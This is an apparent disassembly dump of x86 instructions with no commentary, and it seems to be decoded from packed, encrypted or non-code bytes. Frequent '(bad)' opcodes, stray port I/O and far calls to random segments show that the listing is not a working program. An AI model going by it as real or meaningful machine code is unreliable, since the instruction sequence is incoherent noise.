  4207d9:	sub    eax,0x4c864c5c
  4207de:	xor    DWORD PTR [edx-0xd],edi
  4207e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207e2:	stos   DWORD PTR es:[edi],eax
  4207e3:	fsub   DWORD PTR [edi+0x48ef6a08]
  4207e9:	or     DWORD PTR [eax-0x6],ecx
  4207ec:	(bad)  
  4207ed:	push   ebx
  4207ee:	stc    
  4207ef:	in     al,dx
  4207f0:	sbb    al,0xc3
  4207f2:	push   esi
  4207f3:	imul   ecx,ecx,0xfffffffd
  4207f6:	mov    ebx,0xd98a6271
  4207fb:	scas   al,BYTE PTR es:[edi]
  4207fc:	and    esp,edx
  4207fe:	fcom   QWORD PTR [ecx+ebp*2+0x1b83f324]
  420805:	call   0x652c:0x8921259f
  42080c:	cmp    bl,BYTE PTR [esi-0x3b]
  42080f:	mov    cl,0x3b
  420811:	sti    
  420812:	test   BYTE PTR [ebx+0xbc43c4b],ch
  420818:	cs xchg esi,eax
  42081a:	adc    BYTE PTR [edx+0x46],al
  42081d:	and    ch,dh
  42081f:	mov    eax,0xbac151c8
  420824:	add    ah,cl
  420826:	out    dx,al
  420827:	cmp    DWORD PTR [edi+0x479a7fcf],0x3aaa4bb9
  420831:	jae    0x420865
  420833:	pusha  
  420834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420835:	push   esp
  420836:	js     0x42084d
  420838:	cmp    BYTE PTR [esi+0x7b],0xfb
  42083c:	cmp    eax,DWORD PTR [ebx]
  42083e:	and    ebp,esi
  420840:	jle    0x42089c
  420842:	pop    ebx
  420843:	xor    eax,0x1924e4a6
  420848:	(bad)  
  42084a:	(bad)  
  42084b:	add    edi,DWORD PTR [ebx-0x59]
  42084e:	jno    0x4207fb
  420850:	pop    ecx
  420851:	rcl    BYTE PTR [ebx],1
  420853:	cli    
  420854:	idiv   ch
  420856:	cmp    al,0x61
  420858:	jge    0x42085e
  42085a:	das    
  42085b:	ins    DWORD PTR es:[edi],dx
  42085c:	rol    DWORD PTR [ebx+0x2e],1
  42085f:	int3   
  420860:	mov    al,0xa
  420862:	cmp    ecx,0x8d9997f9
  420868:	adc    al,0x10
  42086a:	mov    edi,0x177cf498
  42086f:	add    ebx,ebp
  420871:	sahf   
  420872:	xor    eax,0x6063fce9
  420877:	test   DWORD PTR [edi+eax*1],ebp
  42087a:	and    eax,0x29b32bfb
  42087f:	add    cl,BYTE PTR [edi+0x42c3dc66]
  420885:	lods   al,BYTE PTR ds:[esi]
  420886:	(bad)  
  420888:	or     DWORD PTR [esi-0x50],esp
  42088b:	shl    DWORD PTR [edx+0x716e089d],1
  420891:	gs cmp al,0x1
  420894:	icebp  
  420895:	lahf   
  420896:	(bad)  
  420897:	fnstenv [edi+ebx*8]
  42089a:	xor    ebx,DWORD PTR [edi-0x85c40de]
  4208a0:	inc    esi
  4208a1:	or     esi,DWORD PTR [ebx+0x1f]
  4208a4:	xlat   BYTE PTR ds:[ebx]
  4208a5:	mov    ds:0x68a91faf,al
  4208aa:	sbb    al,BYTE PTR [ebp-0x6c20c940]
  4208b0:	mov    gs,eax
  4208b2:	inc    esp
  4208b3:	ins    DWORD PTR es:[edi],dx
  4208b4:	xor    al,0x72
  4208b6:	lea    eax,[edi+0x65]
  4208b9:	and    edi,DWORD PTR [edx]
  4208bb:	pop    ebp
  4208bc:	aaa    
  4208bd:	cmp    esp,esp
  4208bf:	jle    0x42086f
  4208c1:	xor    al,0x9a
  4208c3:	je     0x420922
  4208c5:	pop    edx
  4208c6:	xchg   DWORD PTR [edi+0x6dfb4ce],esi
  4208cc:	jnp    0x42094b
  4208ce:	repz je 0x4208bb
  4208d1:	call   0x2676f275
  4208d6:	fstp   DWORD PTR [esi+0x3a1b1046]
  4208dc:	push   eax
  4208dd:	test   al,0xa3
  4208df:	into   
  4208e0:	out    0x33,eax
  4208e2:	inc    edi
  4208e3:	or     eax,0x990f7c90
  4208e8:	push   ds
  4208e9:	xchg   edx,eax
  4208ea:	es xchg esi,eax
  4208ec:	retf   
  4208ed:	shl    bl,cl
  4208ef:	add    BYTE PTR [edx+edx*2],0x94
  4208f3:	push   es
  4208f4:	jg     0x4208e8
  4208f6:	push   ecx
  4208f7:	inc    edx
  4208f8:	jp     0x4208b7
  4208fa:	je     0x4208ec
  4208fc:	(bad)  
  4208fd:	sub    eax,0x4eb96b9a
  420902:	jns    0x4208d1
  420904:	cwde   
  420905:	and    al,0xc8
  420907:	or     eax,0x95528f7b
  42090c:	in     al,0x53
  42090e:	mov    dh,0xba
  420910:	fistp  DWORD PTR [ebx]
  420912:	(bad)  
  420913:	or     edi,DWORD PTR [ebx]
  420915:	xchg   edi,eax
  420916:	enter  0x1128,0x60
  42091a:	out    dx,eax
  42091b:	mov    ds:0xc8bfb9e5,al
  420920:	jp     0x4208ff
  420922:	sub    esp,DWORD PTR [edi-0x67]
  420925:	dec    edi
  420926:	push   es
  420927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420928:	aaa    
  420929:	in     eax,0x7e
  42092b:	ficom  DWORD PTR [esi]
  42092d:	out    0xe4,al
  42092f:	push   cs
  420930:	pop    eax
  420931:	cmp    al,0x71
  420933:	imul   edx,DWORD PTR [ecx],0x92e3da7b
  420939:	add    ebp,DWORD PTR [ecx-0x21e98ffd]
  42093f:	mov    al,ds:0xd68c1159
  420944:	test   eax,0x92a16cf7
  420949:	es mov ah,0xdc
  42094c:	xor    DWORD PTR [ebp-0xf],ebx
  42094f:	dec    esp
  420950:	popa   
  420951:	loop   0x420917
  420953:	and    DWORD PTR [ebp+0x67],0x8bbffb2f
  42095a:	cmp    DWORD PTR [edx+ecx*1-0x2bd609d3],esp
  420961:	push   esp
  420962:	mov    esp,0x46345cde
  420967:	in     eax,dx
  420968:	out    0x47,al
  42096a:	mov    BYTE PTR [ebp-0xa],bh
  42096d:	lods   eax,DWORD PTR ds:[esi]
  42096e:	and    BYTE PTR [esi-0x73],dl
  420971:	daa    
  420972:	stos   DWORD PTR es:[edi],eax
  420973:	dec    esp
  420974:	(bad)  
  420975:	jae    0x420933
  420977:	inc    ebp
  420978:	jbe    0x4209ba
  42097a:	fsub   st,st(2)
  42097c:	sbb    al,0xe9
  42097e:	cmp    DWORD PTR [edx-0x5e481391],0xc18c185f
  420988:	repz fdivr QWORD PTR [ecx+0x7d]
  42098c:	mov    al,ds:0x3b0a85e3
  420991:	or     eax,0xc00e399f
  420996:	fwait
  420997:	outs   dx,DWORD PTR ds:[esi]
  420998:	mov    DWORD PTR [edi-0x20c884ec],eax
  42099e:	es lahf 
  4209a0:	push   edx
  4209a1:	inc    esp
  4209a2:	repz pushf 
  4209a4:	mov    esi,0xb4637861
  4209a9:	and    ebp,ebp
  4209ab:	xor    edx,DWORD PTR [edx]
  4209ad:	mov    BYTE PTR [edi+0x7ff09801],bh
  4209b3:	pop    edi
  4209b4:	mov    edi,0x7dc87b74
  4209b9:	(bad)  
  4209ba:	mov    al,0xf3
  4209bc:	(bad)  
  4209bd:	loopne 0x4209d9
  4209bf:	out    dx,eax
  4209c0:	cmp    al,0x1b
  4209c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209c3:	add    al,0xe9
  4209c5:	push   0x3d1c6489
  4209ca:	cs xchg esp,eax
  4209cc:	je     0x4209f1
  4209ce:	ror    DWORD PTR [ebx+0x22],1
  4209d1:	sub    esp,DWORD PTR [edi+0x3a0047a3]
  4209d7:	leave  
  4209d8:	imul   ebx,DWORD PTR [edi+0x56dba99],0x78
  4209df:	mov    ds:0x632b6b3b,eax
  4209e4:	in     eax,0xba
  4209e6:	jae    0x420a67
  4209e8:	dec    esi
  4209e9:	lahf   
  4209ea:	pop    ebp
  4209eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ec:	push   cs
  4209ed:	not    bl
  4209ef:	fdiv   QWORD PTR [edi-0x1f8dde87]
  4209f5:	pop    ebp
  4209f6:	loopne 0x420a39
  4209f8:	call   0x5fbd:0xffb38ea8
  4209ff:	dec    ecx
  420a00:	xchg   edi,eax
  420a01:	dec    esi
  420a02:	xor    BYTE PTR [eax+edx*8],bl
  420a05:	test   eax,0xd2066967
  420a0a:	mov    al,0xf5
  420a0c:	mov    edi,edi
  420a0e:	and    DWORD PTR [ecx-0x8],esi
  420a11:	outs   dx,DWORD PTR ds:[esi]
  420a12:	jno    0x420a55
  420a14:	stos   DWORD PTR es:[edi],eax
  420a15:	mov    esp,0x472385be
  420a1a:	scas   al,BYTE PTR es:[edi]
  420a1b:	js     0x4209dd
  420a1d:	outs   dx,BYTE PTR ds:[esi]
  420a1e:	sub    esi,DWORD PTR ss:[ebx]
  420a21:	je     0x420a4b
  420a23:	sbb    esi,esp
  420a25:	mov    ss,WORD PTR [edi-0x64]
  420a28:	jl     0x420a01
  420a2a:	js     0x4209e3
  420a2c:	push   ecx
  420a2d:	sub    BYTE PTR [edx-0x57],0x2c
  420a31:	and    eax,0xfe2d78f5
  420a36:	std    
  420a37:	aas    
  420a38:	dec    ecx
  420a39:	outs   dx,DWORD PTR ds:[esi]
  420a3a:	fisub  WORD PTR [ebx+eax*1]
  420a3d:	rol    DWORD PTR [edi+0x57e245df],1
  420a43:	ds scas eax,DWORD PTR es:[edi]
  420a45:	sbb    BYTE PTR [ecx+ecx*2],cl
  420a48:	(bad)  
  420a49:	cs pop esp
  420a4b:	aas    
  420a4c:	adc    ebx,DWORD PTR [eax+0x35]
  420a4f:	int3   
  420a50:	clc    
  420a51:	cld    
  420a52:	fld    DWORD PTR ds:0xb985bae
  420a58:	mov    eax,ebx
  420a5a:	retf   
  420a5b:	adc    eax,0x78ad1890
  420a60:	loope  0x420ab0
  420a62:	adc    bh,BYTE PTR [esi+0x6f6dfcc6]
  420a68:	(bad)  
  420a69:	repz (bad) 
  420a6c:	adc    al,BYTE PTR [esi]
  420a6e:	mov    eax,ds:0x4d99a66f
  420a73:	sbb    BYTE PTR [eax-0x62a709ed],cl
  420a79:	mov    ds:0x4501247a,eax
  420a7e:	mov    dh,0x30
  420a80:	ss (bad) 
  420a82:	pushf  
  420a83:	inc    ebp
  420a84:	aam    0xce
  420a86:	out    0x79,eax
  420a88:	mov    cl,0xf7
  420a8a:	clc    
  420a8b:	fsubp  st(6),st
  420a8d:	jg     0x420a79
  420a8f:	jae    0x420a2a
  420a91:	jmp    0x2476:0x8e239d11
  420a98:	xor    al,0x6
  420a9a:	mov    edi,0x7e9f65db
  420a9f:	sbb    BYTE PTR [ecx-0x45],bl
  420aa2:	sub    ah,0x57
  420aa5:	test   al,0xe7
  420aa7:	or     ebp,DWORD PTR [esi+0x29f0081e]
  420aad:	je     0x420ac0
  420aaf:	jbe    0x420a66
  420ab1:	and    dh,BYTE PTR [ebp+0x7ed2f33e]
  420ab7:	das    
  420ab8:	xor    ch,BYTE PTR [edx]
  420aba:	cmp    esp,0xc7042123
  420ac0:	jecxz  0x420aab
  420ac2:	push   esp
  420ac3:	gs xor eax,0x8fe54905
  420ac9:	xchg   ebp,eax
  420aca:	cmp    esi,esp
  420acc:	out    0xac,eax
  420ace:	mov    ch,0xa7
  420ad0:	cs pop ebx
  420ad2:	mov    al,ds:0x65f75254
  420ad7:	les    eax,FWORD PTR [ebx-0x5f]
  420ada:	retf   0x2097
  420add:	mov    edx,edx
  420adf:	out    0x1f,eax
  420ae1:	xor    esp,0x49
  420ae4:	push   es
  420ae5:	test   DWORD PTR [eax+0x32],ebx
  420ae8:	pop    esi
  420ae9:	test   eax,0x9cfe35de
  420aee:	lods   al,BYTE PTR ds:[esi]
  420aef:	or     esp,DWORD PTR [esi]
  420af1:	pop    ecx
  420af2:	sub    al,0x9d
  420af4:	stos   BYTE PTR es:[edi],al
  420af5:	sub    DWORD PTR [ecx],edi
  420af7:	sub    ch,dh
  420af9:	adc    eax,0xa1d3dbf6
  420afe:	scas   eax,DWORD PTR es:[edi]
  420aff:	sub    eax,0x16b3b13a
  420b04:	push   0xc90a012c
  420b09:	std    
  420b0a:	push   0xe9931b2f
  420b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b10:	addr16 leave 
  420b12:	gs add eax,0x538da640
  420b18:	je     0x420b13
  420b1a:	pop    ds
  420b1b:	pop    ebp
  420b1c:	xchg   BYTE PTR [ebx+eax*4-0x1a],bl
  420b20:	xor    ecx,DWORD PTR [ebx-0x7]
  420b23:	fadd   QWORD PTR [ebx+0x5f]
  420b26:	scas   al,BYTE PTR es:[edi]
  420b27:	add    dl,BYTE PTR [eax-0x2e]
  420b2a:	xchg   ecx,eax
  420b2b:	push   esp
  420b2c:	mov    ecx,0xd867ba2b
  420b31:	das    
  420b32:	aad    0x5c
  420b34:	xor    eax,0xa3ec22de
  420b39:	dec    esi
  420b3a:	enter  0x5409,0xd8
  420b3e:	ja     0x420b10
  420b40:	(bad)  [ecx-0xd556175]
  420b46:	out    dx,al
  420b47:	pop    eax
  420b48:	cli    
  420b49:	xchg   ebx,eax
  420b4a:	sbb    ah,BYTE PTR [edx+esi*4]
  420b4d:	cwde   
  420b4e:	pop    esp
  420b4f:	dec    ebp
  420b50:	mov    ds:0x681b8c28,eax
  420b55:	gs sbb al,0xff
  420b58:	sub    DWORD PTR [ebp-0x456f7e32],edi
  420b5e:	jmp    0x1878:0x4d0ff24d
  420b65:	mov    eax,0xfde20183
  420b6a:	jb     0x420af8
  420b6c:	lods   al,BYTE PTR ds:[esi]
  420b6d:	mov    esi,ebx
  420b6f:	pop    eax
  420b70:	sbb    al,0x4d
  420b72:	push   ebx
  420b73:	pop    esp
  420b74:	jns    0x420b61
  420b76:	xchg   edx,eax
  420b77:	mov    ecx,0x5f6b537e
  420b7c:	adc    BYTE PTR [edi-0x424d22ba],cl
  420b82:	fs mov ch,0x9f
  420b85:	push   cs
  420b86:	inc    esi
  420b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b88:	mov    al,ds:0x6d9ec78e
  420b8d:	rol    dl,0xc4
  420b90:	(bad)  [ecx+0x60af0a64]
  420b96:	add    DWORD PTR [edx],esi
  420b98:	pushf  
  420b99:	push   esi
  420b9a:	dec    ebp
  420b9b:	inc    ebx
  420b9c:	pop    edi
  420b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b9e:	adc    ebx,ebp
  420ba0:	pop    edx
  420ba1:	mov    al,0x35
  420ba3:	cli    
  420ba4:	scas   al,BYTE PTR es:[edi]
  420ba5:	sbb    ebx,ebx
  420ba7:	enter  0xac10,0x1
  420bab:	or     al,0x47
  420bad:	ins    BYTE PTR es:[edi],dx
  420bae:	rcr    DWORD PTR [eax],1
  420bb0:	shr    BYTE PTR [edi+0x188724c0],1
  420bb6:	mov    eax,0x66f5c214
  420bbb:	call   0x86e7:0x1618bae8
  420bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bc3:	div    DWORD PTR [edx-0x73]
  420bc6:	(bad)  
  420bc7:	dec    edx
  420bc8:	sbb    eax,0xe9d45898
  420bcd:	xchg   esi,eax
  420bce:	call   0x8bacadbb
  420bd3:	and    eax,0xd595771d
  420bd8:	sti    
  420bd9:	pop    ebp
  420bda:	(bad)  
  420bdb:	mov    ds:0x5510d30b,al
  420be0:	(bad)  
  420be1:	fwait
  420be2:	les    ebx,FWORD PTR ds:0xa4ac363f
  420be8:	retf   
  420be9:	inc    edi
  420bea:	sub    cl,BYTE PTR [eax+0x6e99ff68]
  420bf0:	pop    ebx
  420bf1:	pop    edi
  420bf2:	sbb    al,0xa6
  420bf4:	addr16 jg 0x420bac
  420bf7:	inc    edx
  420bf8:	in     eax,0x17
  420bfa:	icebp  
  420bfb:	bound  ebx,QWORD PTR [ebp-0x2b7b243b]
  420c01:	mov    DWORD PTR [ecx],edx
  420c03:	bswap  eax
  420c05:	cmp    ebx,ebx
  420c07:	ins    DWORD PTR es:[edi],dx
  420c08:	imul   esi,DWORD PTR [ebp+0x77c56f04],0x576079ad
  420c12:	ja     0x420bbd
  420c14:	jecxz  0x420c46
  420c16:	div    DWORD PTR [ebx+0x7]
  420c19:	mov    cl,0x4c
  420c1b:	out    dx,eax
  420c1c:	sbb    esi,esp
  420c1e:	daa    
  420c1f:	jns    0x420c8a
  420c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c22:	and    DWORD PTR ds:0xd1f6e823,edx
  420c28:	adc    al,0x76
  420c2a:	push   eax
  420c2b:	mov    ebp,0x872ae5d2
  420c30:	jge    0x420c77
  420c32:	repz jb 0x420c3a
  420c35:	mov    edi,0xf5eb48c4
  420c3a:	push   eax
  420c3b:	mov    edx,0x3c0e0e40
  420c40:	push   esp
  420c41:	aam    0xcc
  420c43:	push   ds
  420c44:	inc    ebx
  420c45:	out    dx,al
  420c46:	pop    eax
  420c47:	je     0x420bfa
  420c49:	jbe    0x420cbe
  420c4b:	(bad)  
  420c4d:	cmp    ebx,DWORD PTR [ecx-0x29]
  420c50:	icebp  
  420c51:	test   DWORD PTR [ebx],ecx
  420c53:	lea    esi,[edx-0xfdf3e65]
  420c59:	popa   
  420c5a:	je     0x420c8c
  420c5c:	pop    ebp
  420c5d:	add    DWORD PTR [ebx],esi
  420c5f:	ds mov esi,0x3c5fea23
  420c66:	jge    0x420c89
  420c68:	jg     0x420c22
  420c6a:	and    ax,0x3f32
  420c6e:	jmp    0x420c0e
  420c70:	or     bh,bl
  420c72:	scas   al,BYTE PTR es:[edi]
  420c73:	test   al,0x7c
  420c76:	push   0xffffffce
  420c78:	jae    0x420c4a
  420c7a:	xor    BYTE PTR ds:0xe0a646c9,dh
  420c80:	les    ebx,FWORD PTR [ecx-0x5a]
  420c83:	push   edx
  420c84:	dec    ebp
  420c85:	adc    edx,DWORD PTR [edx+edi*2+0x5d]
  420c89:	xchg   esp,eax
  420c8a:	mov    ch,0xb3
  420c8c:	mov    al,ds:0x6e617d69
  420c91:	sbb    DWORD PTR [esi-0x60d414c5],0xf75ad4d9
  420c9b:	sbb    dl,bh
  420c9d:	inc    ebp
  420c9e:	mov    dh,0xa
  420ca0:	sub    ch,BYTE PTR [ebx+ebx*4-0x408483f3]
  420ca7:	data16 sub al,BYTE PTR [edx-0x1d]
  420cab:	xchg   esi,eax
  420cac:	add    eax,0xeec9a349
  420cb1:	mov    dl,0x2e
  420cb3:	pop    ebp
  420cb4:	cmp    dl,BYTE PTR [ebx+0x0]
  420cb7:	imul   edi,DWORD PTR [ebp+edi*8-0x5b],0xa10c37b8
  420cbf:	mov    edi,0xc92c1ce7
  420cc4:	test   DWORD PTR [edi-0x3b],0x1ae31781
  420ccb:	add    BYTE PTR [ebx],dl
  420ccd:	add    dh,bl
  420ccf:	xor    cl,BYTE PTR [eax-0x3b]
  420cd2:	mov    esi,0x562d9f8a
  420cd7:	cmp    eax,0x225b15cd
  420cdc:	inc    ebx
  420cdd:	push   edi
  420cde:	cmp    ch,BYTE PTR ds:0xb1fc9dca
  420ce4:	jns    0x420d62
  420ce6:	pop    ss
  420ce7:	into   
  420ce8:	clc    
  420ce9:	inc    edi
  420cea:	mov    ebp,0xcb94bf41
  420cef:	cmp    ch,ah
  420cf1:	jmp    0x420cff
  420cf3:	mov    DWORD PTR [edx+0x77d04a15],ebx
  420cf9:	dec    edi
  420cfa:	xor    al,0x4d
  420cfc:	adc    ch,BYTE PTR [ebx-0x915e275]
  420d02:	push   es
  420d03:	push   esp
  420d04:	iret   
  420d05:	out    dx,eax
  420d06:	mov    esp,0xf20b28ec
  420d0b:	mov    cl,BYTE PTR [ecx+0x6ba28e17]
  420d11:	inc    edx
  420d12:	jge    0x420cba
  420d14:	loope  0x420d77
  420d16:	test   al,0xa0
  420d18:	cmp    bl,bl
  420d1a:	pop    ebp
  420d1b:	dec    eax
  420d1c:	add    al,0x4a
  420d1e:	mov    al,ds:0xbd37721
  420d23:	or     al,0x2c
  420d25:	fadd   QWORD PTR [edx]
  420d27:	(bad)  
  420d29:	fcmovnu st,st(2)
  420d2b:	pop    edx
  420d2c:	jmp    0x420d9f
  420d2e:	stos   BYTE PTR es:[edi],al
  420d2f:	shl    dh,0xb1
  420d32:	outs   dx,DWORD PTR ds:[esi]
  420d33:	sub    DWORD PTR [edi+ebx*4+0x47],esi
  420d37:	xchg   edx,eax
  420d38:	sub    BYTE PTR [eax],ah
  420d3a:	cwde   
  420d3b:	dec    ebp
  420d3c:	push   edi
  420d3d:	xchg   edi,eax
  420d3e:	shl    dl,cl
  420d40:	lods   al,BYTE PTR ds:[esi]
  420d41:	outs   dx,BYTE PTR ds:[esi]
  420d42:	adc    edi,esi
  420d44:	or     al,0x2b
  420d46:	lock outs dx,BYTE PTR es:[esi]
  420d49:	cmp    dl,BYTE PTR [esi+0x68cbbd3a]
  420d4f:	mov    esi,DWORD PTR [ebp-0x360142b2]
  420d55:	mov    esp,0xf7b40bfd
  420d5a:	loope  0x420d5c
  420d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d5d:	dec    BYTE PTR [ecx]
  420d5f:	les    edi,FWORD PTR [esp+eiz*2-0x1a6b2572]
  420d66:	das    
  420d67:	loopne 0x420d0a
  420d69:	lahf   
  420d6a:	pushf  
  420d6b:	call   0xced5a1fb
  420d70:	mov    edx,0xdb444fdb
  420d75:	iret   
  420d76:	pushf  
  420d77:	dec    eax
  420d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d79:	imul   BYTE PTR [ecx+0x732f45e0]
  420d7f:	std    
  420d80:	popa   
  420d81:	fcomp  QWORD PTR gs:[edx-0x61]
  420d85:	mov    ah,0x79
  420d87:	jg     0x420d53
  420d89:	cmp    BYTE PTR [ebp+esi*4+0xd],dh
  420d8d:	sahf   
  420d8e:	cmc    
  420d8f:	xor    DWORD PTR [ecx-0x45],eax
  420d92:	jb     0x420d5d
  420d94:	imul   eax,edi,0x20
  420d97:	jo     0x420dc5
  420d99:	sahf   
  420d9a:	or     DWORD PTR [esi],esp
  420d9c:	retf   
  420d9d:	cmp    al,bh
  420d9f:	cmp    al,0x16
  420da1:	aad    0xef
  420da3:	pusha  
  420da4:	pop    esp
  420da5:	rol    DWORD PTR [edi-0x50bc5ed0],1
  420dab:	loopne 0x420da6
  420dad:	pop    ecx
  420dae:	push   ebp
  420daf:	out    dx,eax
  420db0:	out    dx,eax
  420db1:	dec    esi
  420db2:	xchg   esi,eax
  420db3:	mov    ds:0x9f51e5fa,al
  420db8:	mov    ds:0x74c00f02,al
  420dbd:	or     al,0xf8
  420dbf:	pop    es
  420dc0:	lgs    eax,FWORD PTR [edx]
  420dc3:	xchg   ebp,eax
  420dc4:	xor    ebx,esi
  420dc6:	mov    al,ds:0x720a418c
  420dcb:	out    dx,eax
  420dcc:	push   ds
  420dcd:	out    0xe2,eax
  420dcf:	mov    dh,0x90
  420dd1:	test   BYTE PTR [ebp-0x665ca659],ah
  420dd7:	pusha  
  420dd8:	in     al,0xbc
  420dda:	xchg   ecx,eax
  420ddb:	push   edx
  420ddc:	dec    edx
  420ddd:	jne    0x420dcb
  420ddf:	shr    DWORD PTR [ebx+0x3e],0x87
  420de3:	xchg   edi,eax
  420de4:	mov    bh,0xb3
  420de6:	sti    
  420de7:	test   BYTE PTR [ecx+0x476597ff],cl
  420ded:	call   0xb143d494
  420df2:	cmp    DWORD PTR [ecx-0x6ef1b166],0xffffffb9
  420df9:	data16 add ah,BYTE PTR ds:0x29b17fba
  420e00:	in     al,0x23
  420e02:	push   esi
  420e03:	psubw  mm3,mm6
  420e06:	mov    eax,0x5f474664
  420e0b:	xchg   ecx,eax
  420e0c:	jmp    0x9b8d:0xb00cc71d
  420e13:	nop
  420e14:	jno    0x420e69
  420e16:	add    bl,cl
  420e18:	mov    ds:0xd783f5ce,al
  420e1d:	mov    al,ds:0x5ea00751
  420e22:	dec    esp
  420e23:	fisub  WORD PTR [esi+eiz*2-0x45386b34]
  420e2a:	sbb    eax,ebx
  420e2c:	inc    edx
  420e2d:	push   esp
  420e2e:	lea    esi,[ecx-0x76]
  420e31:	in     al,0x14
  420e33:	pusha  
  420e34:	mov    fs,edi
  420e36:	test   eax,0x741ea2a7
  420e3b:	mov    esp,0x878884b5
  420e40:	in     al,0x3c
  420e42:	mov    dl,0x5c
  420e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e45:	les    edx,FWORD PTR [edx+ecx*4]
  420e48:	pop    ds
  420e49:	stos   DWORD PTR es:[edi],eax
  420e4a:	cmp    bh,BYTE PTR [edi]
  420e4c:	xchg   BYTE PTR [edx+ebx*4-0x4ad4baba],ah
  420e53:	mov    ecx,0xd29a1f7e
  420e58:	xor    al,0xa0
  420e5a:	sbb    al,0xf6
  420e5c:	xchg   ebp,eax
  420e5d:	xor    al,0x17
  420e5f:	inc    esi
  420e60:	sub    eax,0xce5333b5
  420e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e66:	inc    esp
  420e67:	dec    DWORD PTR cs:[ebx+0x6cad4ca0]
  420e6e:	mov    DWORD PTR [edi],0xbad3827
  420e74:	nop
  420e75:	or     eax,0x5ce5b99c
  420e7a:	cmp    al,0xa7
  420e7c:	xchg   DWORD PTR [ebx+0xd],ebx
  420e7f:	push   es
  420e80:	xchg   esi,eax
  420e81:	mov    esp,DWORD PTR [ecx-0x63]
  420e84:	jecxz  0x420e27
  420e86:	cdq    
  420e87:	sti    
  420e88:	push   es
  420e89:	sub    al,0x8c
  420e8b:	stos   DWORD PTR es:[edi],eax
  420e8c:	adc    al,0xf7
  420e8e:	call   0xf232:0x4a73c6dc
  420e95:	cmp    esp,DWORD PTR ds:0x8d3d2e09
  420e9b:	and    BYTE PTR [ebp-0x4c9a7abd],0xa5
  420ea2:	dec    eax
  420ea3:	cmp    al,0xbe
  420ea5:	mov    ebp,0xe9ca240f
  420eaa:	pop    ecx
  420eab:	scas   eax,DWORD PTR es:[edi]
  420eac:	push   esi
  420ead:	retf   
  420eae:	test   al,0x6b
  420eb0:	sti    
  420eb1:	dec    ebp
  420eb2:	mov    al,ds:0xd41b981c
  420eb7:	bound  ecx,QWORD PTR [edx]
  420eb9:	push   ds
  420eba:	push   es
  420ebb:	or     al,0xda
  420ebd:	jbe    0x420e4c
  420ebf:	out    dx,eax
  420ec0:	cwde   
  420ec1:	adc    eax,0x5b2c6b2f
  420ec6:	(bad)  
  420ec7:	arpl   WORD PTR [esi*8-0x7e2311df],dx
  420ece:	jl     0x420eae
  420ed0:	pop    ebx
  420ed1:	xchg   DWORD PTR [ecx-0x76],esi
  420ed4:	cmp    DWORD PTR [ebp+0x4a],ecx
  420ed7:	imul   edx,DWORD PTR [eax+ecx*4],0x76
  420edb:	leave  
  420edc:	(bad)  
  420edd:	sahf   
  420ede:	lods   eax,DWORD PTR ds:[esi]
  420edf:	std    
  420ee0:	mov    ebp,0x1e44d0bc
  420ee5:	mov    ebp,0x337fe434
  420eea:	shl    BYTE PTR [esi],cl
  420eec:	xchg   esp,eax
  420eed:	mov    eax,0xf60a7beb
  420ef2:	xor    al,0x8c
  420ef4:	cdq    
  420ef5:	or     DWORD PTR [ecx+0x29ceff27],edi
  420efb:	push   cs
  420efc:	mov    ah,0xb3
  420efe:	aam    0xb3
  420f00:	gs je  0x420f34
  420f03:	cmp    bl,dh
  420f05:	enter  0xbe5b,0xa6
  420f09:	and    cl,bl
  420f0b:	cs imul edi,ecx,0x77cba87b
  420f12:	sub    eax,0x7d8808cd
  420f17:	jmp    0x65de:0x5203ae4a
  420f1e:	adc    ah,BYTE PTR [ebx]
  420f20:	or     eax,0x22fcce2
  420f25:	cmp    DWORD PTR [edx-0x5d],eax
  420f28:	push   ebp
  420f29:	push   esp
  420f2a:	es fsub st(6),st
  420f2d:	sub    bl,0xa0
  420f30:	pop    edi
  420f31:	add    bl,dl
  420f33:	out    dx,eax
  420f34:	into   
  420f35:	and    bl,BYTE PTR [ebx-0x372acf6b]
  420f3b:	test   DWORD PTR [eax],0xe22cf1d4
  420f41:	shr    DWORD PTR [edi],0x85
  420f44:	mov    esi,edi
  420f46:	(bad)  
  420f47:	mov    dl,0x32
  420f49:	push   0xffffffe2
  420f4b:	adc    esi,DWORD PTR [ebp+0x6a]
  420f4e:	int3   
  420f4f:	fucomp st(6)
  420f51:	gs call 0x5ce1:0x289d7ee5
  420f59:	jb     0x420ef1
  420f5b:	shl    DWORD PTR [ecx+0x2c173ffc],1
  420f61:	fiadd  WORD PTR [ebx]
  420f63:	push   ebx
  420f64:	shl    bl,1
  420f66:	or     al,bh
  420f68:	mov    ecx,0xae451640
  420f6d:	aas    
  420f6e:	inc    ebx
  420f6f:	push   ebx
  420f70:	addr16 ret 
  420f72:	sar    DWORD PTR [edi+0x7e],1
  420f75:	cwde   
  420f76:	jae    0x420fb6
  420f78:	mov    eax,ds:0x2f16398c
  420f7d:	dec    ebp
  420f7e:	cmc    
  420f7f:	std    
  420f80:	or     BYTE PTR [eax+0x2bb7e8a3],ah
  420f86:	cmp    ah,dl
  420f88:	adc    eax,0x583cd4c7
  420f8d:	xchg   edx,eax
  420f8e:	pop    edi
  420f8f:	out    dx,al
  420f90:	fldenv [ecx-0x63]
  420f93:	outs   dx,DWORD PTR ds:[si]
  420f95:	pop    esi
  420f96:	cld    
  420f97:	leave  
  420f98:	or     BYTE PTR [eax-0x12a81986],ch
  420f9e:	jl     0x420faf
  420fa0:	fisub  DWORD PTR [esi]
  420fa2:	hlt    
  420fa3:	bound  ebx,QWORD PTR [edi+0x27]
  420fa6:	mov    ds:0x2f4a9dc4,al
  420fab:	xor    al,0x7a
  420fad:	test   BYTE PTR [eax],0x3b
  420fb0:	imul   ebx,DWORD PTR [edi-0x27],0xb1d0b44f
